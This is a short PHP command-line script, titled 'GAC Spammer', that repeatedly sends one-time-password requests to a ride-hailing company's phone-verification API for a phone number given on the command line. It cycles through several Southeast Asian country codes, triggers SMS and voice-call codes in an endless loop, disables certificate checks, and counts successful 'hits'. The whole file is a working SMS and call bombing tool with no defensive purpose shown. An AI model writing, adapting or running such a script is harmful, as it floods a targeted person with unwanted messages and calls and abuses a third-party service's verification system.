<?php

if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["SMS", "CALL", "ALL"]))) {
	echo "Usage: php ".basename(__FILE__)." <phone_number> [SMS|CALL|ALL]\n";
	exit;
} elseif (!isset($argv[2])) {
	$argv[2] = "SMS";
}

$countries = ["MY", "SG", "ID", "TH", "VN", "KH", "PH", "MM"];
shuffle($countries);

$ch = curl_init("https://api.grab.com/grabid/v1/phone/otp");
curl_setopt_array($ch, [
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_SSL_VERIFYPEER => false
]);

if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - 0 Hits");

$last_success = ["SMS" => 0, "CALL" => 0];

$i = 0;
while (true) {
	foreach ($countries as $countryCode) {
		foreach (["SMS", "CALL"] as $method) {
			if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
				curl_setopt($ch, CURLOPT_POSTFIELDS, "method=".$method."&countryCode=".$countryCode."&phoneNumber=".$argv[1]."&templateID=&numDigits=4");
				curl_exec($ch);
				if (curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {
					echo date("[H:i:s]")." ".$method." OTP Requested.\n";
					if (function_exists("cli_set_process_title")) cli_set_process_title("GAC Spammer - ".number_format(++$i)." Hits");
				}
			}
		}
	}
	sleep(1);
}

?>